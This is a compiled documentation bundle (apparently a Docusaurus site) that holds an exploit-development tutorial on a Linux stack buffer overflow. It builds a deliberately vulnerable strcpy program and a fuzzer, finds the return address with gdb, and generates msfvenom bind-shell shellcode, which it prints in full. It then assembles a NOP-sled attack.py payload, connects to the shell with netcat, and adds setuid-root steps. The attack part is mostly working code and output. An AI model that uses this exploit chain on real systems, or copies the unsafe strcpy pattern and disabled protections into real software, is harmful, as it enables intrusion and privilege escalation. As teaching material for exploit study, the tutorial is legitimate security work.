"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[4469],{7554:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>o,contentTitle:()=>c,default:()=>l,frontMatter:()=>i,metadata:()=>x,toc:()=>d});var s=r(74848),t=r(28453);const i={},c="Linux Buffer Overflow with Listening Shell",x={id:"cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_with_listening_shell/buffer_overflow_with_listening_shell",title:"Linux Buffer Overflow with Listening Shell",description:"After compiling [copier.c] using gcc:",source:"@site/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_with_listening_shell/buffer_overflow_with_listening_shell.md",sourceDirName:"cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_with_listening_shell",slug:"/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_with_listening_shell/",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_with_listening_shell/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"docsSidebar",previous:{title:"Buffer Overflow with HTTP Query Parameters",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_query_params/"},next:{title:"Buffer Overflow Exploit without Shellcode (Redirection of EIP) in 32bit Executable",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_without_shellcode_32bit/"}},o={},d=[{value:"Analyzing Crash with <code>gdb</code>",id:"analyzing-crash-with-gdb",level:2},{value:"Generating Shellcode using <code>msfvenom</code>",id:"generating-shellcode-using-msfvenom",level:2},{value:"Return Address in <code>NOP</code> Sled",id:"return-address-in-nop-sled",level:2},{value:"Building the Exploit",id:"building-the-exploit",level:2},{value:"Getting a Shell",id:"getting-a-shell",level:2}];function a(e){const n={code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,t.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"linux-buffer-overflow-with-listening-shell",children:"Linux Buffer Overflow with Listening Shell"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",metastring:'title="copier.c"',children:'#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n\nint copier(char *str);\n\n// compile with gcc -g -z execstack -no-pie -o copier copier.c\nvoid main(int argc, char *argv[]) {\n\tif( argc != 2 ) {\n\t \t\tprintf("Usage: %s string\\n", argv[0]);\n   \t\texit(0);\n\t}\n\tprintf("esp: %#010x\\n", copier(argv[1]));\n\tprintf("Done!\\n");\n}\n\nint copier(char *str) {\n\tchar buffer[1000];\n\tregister int i asm("esp");\n\tstrcpy(buffer, str);\n\treturn i;\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["After compiling [copier.c] using ",(0,s.jsx)(n.code,{children:"gcc"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n\ndie () {\n echo >&2 "$@"\n exit 1\n }\n\n[ "$#" -eq 2 ] || die "usage: compile_c.sh /path/to/src.c arch (32|64)"\n\nsrc=$1\narch=$2\n\nfilename="$(basename -s .c $src)"\ntmp_dir=$(mktemp -d --suffix=-$filename /tmp/XXXX)\noutput="$tmp_dir/$filename-$arch"\n\necho "compiling $src..."\n\nif [[ $arch -eq "64" ]]\nthen\n boundary=3\nelse\n boundary=2\nfi\n\ncc \\\n -mpreferred-stack-boundary=$boundary \\\n -ggdb \\\n -static \\\n -"m$arch" \\\n -no-pie \\\n -fno-stack-protector \\\n -z execstack \\\n -o $output $src\n\n\necho "Compilation complete, see file $output"\n'})}),"\n",(0,s.jsx)(n.p,{children:"We send 1004 Us to the program to make it crash.\nWe use the helper fuzzer script:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"#!/usr/bin/python3\n\nimport sys\nimport argparse\nimport re\n\n\ndef address_regex_type(arg_value, pat=re.compile(r\"0x[a-f0-9A-F]{8}\")):\n    if not pat.match(arg_value):\n        raise argparse.ArgumentTypeError(\"Invalid memory address supplied. Example value: 0x565556dc\")\n    return arg_value\n\n\ndef main():\n\n    m_parser = argparse.ArgumentParser(\n        description=\"Fuzzer and shellcode creator\",\n        prog=\"fuzzshell\"\n    )\n    m_parser.version = '1.0.0'\n\n    m_parser.add_argument(\n        '-mem_add',\n        '--a',\n        type=address_regex_type,\n        help='The memory address to append to payload'\n    )\n\n    m_parser.add_argument(\n        'prefix',\n        type=int,\n        nargs='?',\n        const=0,\n        default=0,\n        help='Number of characters to append to beginning of payload'\n    )\n\n    m_parser.add_argument(\n        '-version',\n        action='version'\n    )\n\n    m_parser.add_argument(\n        '-suffix',\n        '--s',\n        type=int,\n        nargs='?',\n        const=0,\n        default=0,\n        help='Number of characters to append to end of payload',\n    )\n\n    m_parser.add_argument(\n        '-suffix-fuzz-char',\n        '--sf',\n        type=str,\n        help=\"Character to use as fuzzer for the suffix\",\n        nargs='?',\n        const=\"U\", # Converts to 55 in bytes, easy to see\n        default=\"U\"\n    )\n\n    m_parser.add_argument(\n        '-prefix-fuzz-char',\n        '--pf',\n        type=str,\n        help=\"Character to use as fuzzer for the prefix\",\n        nargs='?',\n        const=\"U\", # Converts to 55 in bytes, easy to see\n        default=\"U\"\n    )\n\n    args = m_parser.parse_args()\n    \n    memory_address=args.a\n    number_of_chars_prefix=args.prefix\n    number_of_chars_postfix=args.s\n\n    prefix = number_of_chars_prefix * args.pf\n    suffix = number_of_chars_postfix * args.sf\n\n    if memory_address:\n        hex_mem_address = memory_address.split(\"0x\")[1]\n\n        reversed_hex_mem_bytes = [hex_mem_address[i:i+2] for i in range(0, len(hex_mem_address), 2)]\n\n        reversed_hex_mem_bytes.reverse()\n\n        hex_str = \"\"\n        for byte in reversed_hex_mem_bytes:\n            hex_str += chr(int(byte, 16))\n        \n        eip = hex_str\n\n        print(prefix + eip + suffix)\n    else:\n        print(prefix + suffix)\n\nif __name__ == \"__main__\":\n    main()\n"})}),"\n",(0,s.jsxs)(n.p,{children:["to generate 1008 ",(0,s.jsx)(n.code,{children:"U"}),"s and cause the crash:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"./copier-32 $(create_shellcode_input.py 1000)\nesp: 0xffffc5fc\nDone!\n\n\n\n./copier-32 $(create_shellcode_input.py 1008)\n[1]    420177 segmentation fault (core dumped)  ./copier-32 $(create_shellcode_input.py 1008)\n"})}),"\n",(0,s.jsxs)(n.h2,{id:"analyzing-crash-with-gdb",children:["Analyzing Crash with ",(0,s.jsx)(n.code,{children:"gdb"})]}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"gdb"})," allows us to check out the memory contents when the crash occurs."]}),"\n",(0,s.jsxs)(n.p,{children:["The first thing we need to do is analyze the source code to see what Assembly instruction causes the buffer overflow. Reviewing the source code [copier.c], we can see that it occurs in line 20 where we use the ",(0,s.jsx)(n.code,{children:"strcpy"})," method to copy the value of the ",(0,s.jsx)(n.code,{children:"str"})," argument into the ",(0,s.jsx)(n.code,{children:"buffer"})," character array:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'(gdb) l 17,\n17      int copier(char *str) {\n18              char buffer[1000];\n19              register int i asm("esp");\n20              strcpy(buffer, str);           <====\n21              return i;\n22      }\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Let's look at the Assembly instructions behind the ",(0,s.jsx)(n.code,{children:"copier"})," method and find the byte offset from the beginning of the method memory address:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"(gdb) disas copier\nDump of assembler code for function copier:\n   0x08049dc0 <+0>:     endbr32 \n   0x08049dc4 <+4>:     push   %ebp\n   0x08049dc5 <+5>:     mov    %esp,%ebp\n   0x08049dc7 <+7>:     push   %ebx\n   0x08049dc8 <+8>:     sub    $0x3e8,%esp\n   0x08049dce <+14>:    call   0x8049df3 <__x86.get_pc_thunk.ax>\n   0x08049dd3 <+19>:    add    $0x9b22d,%eax\n   0x08049dd8 <+24>:    pushl  0x8(%ebp)\n   0x08049ddb <+27>:    lea    -0x3ec(%ebp),%edx\n   0x08049de1 <+33>:    push   %edx\n   0x08049de2 <+34>:    mov    %eax,%ebx\n   0x08049de4 <+36>:    call   0x8049030\n=> 0x08049de9 <+41>:    add    $0x8,%esp\n   0x08049dec <+44>:    mov    %esp,%eax\n   0x08049dee <+46>:    mov    -0x4(%ebp),%ebx\n   0x08049df1 <+49>:    leave  \n   0x08049df2 <+50>:    ret    \nEnd of assembler dump.\n"})}),"\n",(0,s.jsxs)(n.p,{children:["We can see that there's a system call in byte +36 which is the execution ",(0,s.jsx)(n.code,{children:"strcpy"}),". We put the breakpoint in the instruction right below it (see arrow in output above, byte +41) so we can examine the memory contents and see where the ",(0,s.jsx)(n.code,{children:"RET"})," address lies for the subroutine."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"(gdb) b * copier +41\n"})}),"\n",(0,s.jsx)(n.p,{children:"Now let's run the program again with the payload that caused the crash:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'(gdb) run $(create_shellcode_input.py 1008 -suffix 1 --sf 1234)\nStarting program: /tmp/U2Cs-copier/copier-32 $(create_shellcode_input.py 1008 -suffix 1 --sf 1234)\n\nBreakpoint 1, 0x08049de9 in copier (str=0xffffcb00 "\\377\\373\\353\\277\\006") at copier.c:20\n20              strcpy(buffer, str);\n'})}),"\n",(0,s.jsxs)(n.p,{children:["We've froze the execution. We can now examine the memory to see the stack start (",(0,s.jsx)(n.code,{children:"esp"}),") and end (",(0,s.jsx)(n.code,{children:"ebp"}),") addresses."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"(gdb) i r esp\nesp            0xffffc4e4          0xffffc4e4\n(gdb) i r ebp\nebp            0xffffc8d8          0xffffc8d8\n"})}),"\n",(0,s.jsxs)(n.p,{children:["The stack is ",(0,s.jsx)(n.code,{children:"0x3F4"})," in size (",(0,s.jsx)(n.code,{children:"1012"})," in decimal) which identical to the number of characters we're sending in the payload (",(0,s.jsx)(n.code,{children:"1008*'U' + '1234'"}),").\nThis means that we've likely overwritten the whole stack and set the ",(0,s.jsx)(n.code,{children:"RET"})," address to whatever ASCII ",(0,s.jsx)(n.code,{children:"1234"})," equals in hexadecimal (which is ",(0,s.jsx)(n.code,{children:"0x34333231"}),")."]}),"\n",(0,s.jsxs)(n.p,{children:["Since we know that the ",(0,s.jsx)(n.code,{children:"RET"})," is 4 bytes higher in memory than the ",(0,s.jsx)(n.code,{children:"EBP"}),", we can see what instruction we have there:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"(gdb) x/x $ebp+4\n0xffffc8dc:     0x34333231\n"})}),"\n",(0,s.jsxs)(n.p,{children:["We can now confirm the ",(0,s.jsx)(n.code,{children:"RET"})," address contains our suffix ",(0,s.jsx)(n.code,{children:"1234"})," in it. So we're in full control of the ",(0,s.jsx)(n.code,{children:"EIP"}),". Knowing how to control the ",(0,s.jsx)(n.code,{children:"EIP"})," means we can now move the instruction pointer to an arbitrary memory address within the stack where we'll set up a ",(0,s.jsx)(n.code,{children:"NOP"})," sled. The ",(0,s.jsx)(n.code,{children:"EIP"})," will proceed to execute the ",(0,s.jsx)(n.code,{children:"NOP"}),"s until it hits an address where we will inplant our reverse shellcode."]}),"\n",(0,s.jsx)(n.p,{children:"This is how the payload should look like:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'./copier-32 "<$NOP_SLED><$SHELLCODE><$FUZZING$><$RETURN_LOCATION_IN_NOPSLED>"\n'})}),"\n",(0,s.jsxs)(n.p,{children:["At this point, all we know is ",(0,s.jsx)(n.code,{children:"FUZZING='U'*1008"}),". Let's take a look how to create the shellcode and how the ",(0,s.jsx)(n.code,{children:"NOP"})," is defined."]}),"\n",(0,s.jsxs)(n.h2,{id:"generating-shellcode-using-msfvenom",children:["Generating Shellcode using ",(0,s.jsx)(n.code,{children:"msfvenom"})]}),"\n",(0,s.jsx)(n.p,{children:"We will use Metasploit to generate the shellcode for us."}),"\n",(0,s.jsxs)(n.p,{children:["We want to create a reverse shell payload for the ",(0,s.jsx)(n.code,{children:"x86"})," architecture on Linux. The purpose of the shellcode is to open a port on the machine (hackers like to use port ",(0,s.jsx)(n.code,{children:"4444"}),"). Then we can open a connection using a client such as ",(0,s.jsx)(n.code,{children:"netcat"})," or ",(0,s.jsx)(n.code,{children:"telnet"})," from another terminal and get access."]}),"\n",(0,s.jsxs)(n.p,{children:["We want to ensure that the shellcode will not contain anything that can terminate the ",(0,s.jsx)(n.code,{children:"stdin"})," (such as a ",(0,s.jsx)(n.code,{children:"null"})," byte ",(0,s.jsx)(n.code,{children:"0x00"}),") so we specify the encoder to contain only alphanumeric characters. To do this, we run the following command:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 AppendExit=true --encoder x86/alpha_mixed -f python -o ./reverse_shellcode.py \n\n[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of x86/alpha_mixed\nx86/alpha_mixed succeeded with size 231 (iteration=0)\nx86/alpha_mixed chosen with final size 231\nPayload size: 231 bytes\nFinal size of python file: 1133 bytes\nSaved as: ./reverse_shellcode.py\n"})}),"\n",(0,s.jsx)(n.p,{children:"Take a look at the generated shellcode:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",metastring:'title="reverse_shellcode.py"',children:'buf =  b""\nbuf += b"\\x89\\xe0\\xd9\\xe9\\xd9\\x70\\xf4\\x58\\x50\\x59\\x49\\x49\\x49"\nbuf += b"\\x49\\x49\\x49\\x49\\x49\\x49\\x49\\x43\\x43\\x43\\x43\\x43\\x43"\nbuf += b"\\x37\\x51\\x5a\\x6a\\x41\\x58\\x50\\x30\\x41\\x30\\x41\\x6b\\x41"\nbuf += b"\\x41\\x51\\x32\\x41\\x42\\x32\\x42\\x42\\x30\\x42\\x42\\x41\\x42"\nbuf += b"\\x58\\x50\\x38\\x41\\x42\\x75\\x4a\\x49\\x36\\x51\\x69\\x4b\\x68"\nbuf += b"\\x77\\x69\\x73\\x72\\x73\\x33\\x73\\x42\\x73\\x70\\x6a\\x57\\x72"\nbuf += b"\\x6f\\x79\\x79\\x71\\x6e\\x50\\x61\\x76\\x6a\\x6d\\x4f\\x70\\x63"\nbuf += b"\\x6b\\x31\\x4e\\x31\\x42\\x35\\x38\\x56\\x62\\x75\\x50\\x34\\x51"\nbuf += b"\\x53\\x6c\\x63\\x5a\\x76\\x70\\x70\\x51\\x32\\x70\\x6c\\x49\\x4b"\nbuf += b"\\x51\\x32\\x4a\\x35\\x36\\x70\\x58\\x58\\x4d\\x6d\\x50\\x6b\\x39"\nbuf += b"\\x62\\x61\\x74\\x44\\x6e\\x53\\x53\\x34\\x68\\x30\\x45\\x36\\x6a"\nbuf += b"\\x6d\\x6f\\x70\\x30\\x43\\x48\\x30\\x71\\x76\\x48\\x4d\\x6d\\x50"\nbuf += b"\\x5a\\x33\\x43\\x69\\x71\\x7a\\x65\\x6f\\x63\\x68\\x38\\x4d\\x6d"\nbuf += b"\\x50\\x52\\x69\\x33\\x49\\x6c\\x38\\x42\\x48\\x46\\x4f\\x46\\x4f"\nbuf += b"\\x52\\x53\\x63\\x58\\x72\\x48\\x34\\x6f\\x53\\x52\\x31\\x79\\x52"\nbuf += b"\\x4e\\x4d\\x59\\x4a\\x43\\x70\\x50\\x33\\x63\\x6e\\x69\\x78\\x61"\nbuf += b"\\x4c\\x70\\x64\\x4b\\x58\\x4d\\x6d\\x50\\x76\\x51\\x6b\\x6b\\x43"\nbuf += b"\\x5a\\x53\\x31\\x66\\x38\\x6a\\x6d\\x6f\\x70\\x41\\x41"\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Now that we have the shellcode, we can define a ",(0,s.jsx)(n.code,{children:"NOP"})," sled of a certain size. Since we know the size of the entire stack is ",(0,s.jsx)(n.code,{children:"1012"}),", we can set the ",(0,s.jsx)(n.code,{children:"NOP"})," sled to ",(0,s.jsx)(n.code,{children:"500"})," characters long:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"NOP_SLED = '\\x90' * 500\n"})}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.code,{children:"NOP_SLED"})," - check. ",(0,s.jsx)(n.code,{children:"SHELLCODE"})," - check. The last part of the payload is the ",(0,s.jsx)(n.code,{children:"RETURN_LOCATION_IN_NOPSLED"}),". Let's find it."]}),"\n",(0,s.jsxs)(n.h2,{id:"return-address-in-nop-sled",children:["Return Address in ",(0,s.jsx)(n.code,{children:"NOP"})," Sled"]}),"\n",(0,s.jsxs)(n.p,{children:["The reason behind appending a memory address to the end of the payload is because this will be the next instruction executed once the ",(0,s.jsx)(n.code,{children:"copier"})," function completes execution (the ",(0,s.jsx)(n.code,{children:"RET"})," address in Assembly). This is where we bind the execution reverse shellcode with the program that is vulnerable to buffer overflow."]}),"\n",(0,s.jsxs)(n.p,{children:["Choosing the address is arbitrary because it will be sufficient to choose one that is anywhere within the designated memory address range where the ",(0,s.jsx)(n.code,{children:"NOP"})," instructions lie."]}),"\n",(0,s.jsxs)(n.p,{children:["Using ",(0,s.jsx)(n.code,{children:"gdb"}),", it's quite easy to find an address:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'gdb copier-32\n\nReading symbols from copier-32...\nBreakpoint 1 at 0x8049de9: file copier.c, line 20.\n\nBreakpoint 1, 0x08049de9 in copier (str=0xffffcc00 "") at copier.c:20\n\n(gdb) x/64x $esp\n20              strcpy(buffer, str);\n0xffffc554:     0xffffc55c      0xffffcc46      0x90909090      0x90909090\n0xffffc564:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffc574:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffc584:     0x90909090      0x90909090      0x90909090      0x90909090\n0xffffc594:     0x90909090      0x90909090      0x90909090      0x90909090\n...\n0xffffc6e4:     0x90909090      0x90909090      0x90909090      0x90909090\n...\n0xffffc834:     0x4141706f      0x55555555      0x55555555      0x55555555\n0xffffc844:     0x55555555      0x55555555      0x55555555      0x55555555\n0xffffc854:     0x55555555      0x55555555      0x55555555      0x55555555\n0xffffc864:     0x55555555      0x55555555      0x55555555      0x55555555\n0xffffc874:     0x55555555      0x55555555      0x55555555      0x55555555\n....\n0xffffc904:     0x55555555      0x55555555      0x55555555      0x55555555\n0xffffc914:     0x55555555      0x55555555      0x55555555      0x55555555\n0xffffc924:     0x55555555      0x55555555      0x55555555      0x55555555\n0xffffc934:     0x55555555      0x55555555      0x55555555      0x55555555\n0xffffc944:     0x55555555      0x55555555      0xffffc6e4      0xffffcc00\n...\n'})}),"\n",(0,s.jsxs)(n.p,{children:["We can choose any memory address within the range of ",(0,s.jsx)(n.code,{children:"x90"})," words. Let's select ",(0,s.jsx)(n.code,{children:"0xffffc6e4"}),"."]}),"\n",(0,s.jsx)(n.p,{children:"Since the memory words are filled out in little Endian form, in order for us to add the memory address to the shellcode, we will need to transform it and feed it into the payload in the opposite direction:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"#0xffffc6e4 => \\xe4\\xc6\\xff\\xff\nRETURN_LOCATION_IN_NOPSLED = '\\xe4\\xc6\\xff\\xff'\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Avoid addresses containing ",(0,s.jsx)(n.code,{children:"00"}),", ",(0,s.jsx)(n.code,{children:"10"}),", or ",(0,s.jsx)(n.code,{children:"20"})," bytes, which will be be treated as delimiters and terminate the string prematurely."]}),"\n",(0,s.jsx)(n.p,{children:"We now have all the necessary pieces of the payload in order to exploit the buffer overflow and have user access. Let's put it all together."}),"\n",(0,s.jsx)(n.h2,{id:"building-the-exploit",children:"Building the Exploit"}),"\n",(0,s.jsxs)(n.p,{children:["Remember the file ",(0,s.jsx)(n.code,{children:"./reverse_shellcode.py"})," includes our shellcode. Let's copy it and use it as the basis for our attack script."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"cp ./revese_shellcode.py attack.py\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Next, let's add the following lines to ",(0,s.jsx)(n.code,{children:"attack.py"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",metastring:'title="attack.py"',children:"#!/usr/bin/python\n\nbuf =  b\"\"\nbuf += b\"\\x89\\xe0\\xd9\\xe9\\xd9\\x70\\xf4\\x58\\x50\\x59\\x49\\x49\\x49\"\n# ...\nbuf += b\"\\x5a\\x53\\x31\\x66\\x38\\x6a\\x6d\\x6f\\x70\\x41\\x41\"\n\n# Add from here down\nNOP_SLED = '\\x90' * 500\nEIP = '\\xe4\\xc6\\xff\\xff'\nFUZZING = 'U' * (1008 - len(NOP_SLED) - len(buf))\n\nNOP_SLED = '\\x90' * 500\nFUZZING   = 'U' * (1008 - len(NOP_SLED) - len(buf))\n\n# 0xffffc6e4\nRETURN_LOCATION_IN_NOPSLED = '\\xe4\\xc6\\xff\\xff'\n\nattack = NOP_SLED + buf + FUZZING + RETURN_LOCATION_IN_NOPSLED\n\nprint(attack)\n"})}),"\n",(0,s.jsx)(n.p,{children:"Let's see what it prints out:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"chmod +x ./attack.py\npXPYIIIIIIIIIICCCCCC7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI6QiKhwisrs3sBspjWroyyqnPavjmOpck1N1B58VbuP4QSlcZvppQ2plIKQ2J56pXXMmPk9batDnSS4h0E6jmop0CH0qvHMmPZ3Ciqzeoch8MmPRi3Il8BHFOFORScXrH4oSR1yRNMYJCpP3cnixaLpdKXMmPvQkkCZS1f8jmopAAUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\n"})}),"\n",(0,s.jsx)(n.h2,{id:"getting-a-shell",children:"Getting a Shell"}),"\n",(0,s.jsx)(n.p,{children:"We have completed all the necessary steps to create the payload, let's actually run the exploit and see if we can get access from another terminal."}),"\n",(0,s.jsx)(n.p,{children:"To run the exploit:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"./copier-32 $(./attack.py)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["We can see that nothing happens, the ",(0,s.jsx)(n.code,{children:"copier-32"})," is executed but it's not immediately terminated."]}),"\n",(0,s.jsxs)(n.p,{children:["From another terminal (or using another ",(0,s.jsx)(n.code,{children:"tmux"})," window/pane), let's check whether there's anything listening on port ",(0,s.jsx)(n.code,{children:"4444"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'ss -pant | grep 4444\n\nLISTEN      0        0      0.0.0.0:4444  0.0.0.0:*       users:(("copier-32",pid=136386,fd=3))\n'})}),"\n",(0,s.jsxs)(n.p,{children:["From the output, we can see that the binary ",(0,s.jsx)(n.code,{children:"copier-32"})," (Process ID ",(0,s.jsx)(n.code,{children:"136386"}),") is listening on ",(0,s.jsx)(n.code,{children:"4444"}),". Let's try to connect to it:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"nc localhost 4444\nwhoami\nmy_linux_user\n"})}),"\n",(0,s.jsxs)(n.p,{children:["As we can see above, we got a shell, but that it's not ",(0,s.jsx)(n.code,{children:"root"}),". The reason is that the binary ",(0,s.jsx)(n.code,{children:"copier-32"})," was run with user ",(0,s.jsx)(n.code,{children:"my_linux_user"})," and not with ",(0,s.jsx)(n.code,{children:"root"}),". To be able to get ",(0,s.jsx)(n.code,{children:"root"})," access, the binary ",(0,s.jsx)(n.code,{children:"copier-32"})," would need to be owned by ",(0,s.jsx)(n.code,{children:"root"})," also:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"sudo chown root copier-32\nsudo chmod +s copier-32\n"})})]})}function l(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(a,{...e})}):a(e)}},28453:(e,n,r)=>{r.d(n,{R:()=>c,x:()=>x});var s=r(96540);const t={},i=s.createContext(t);function c(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function x(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:c(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);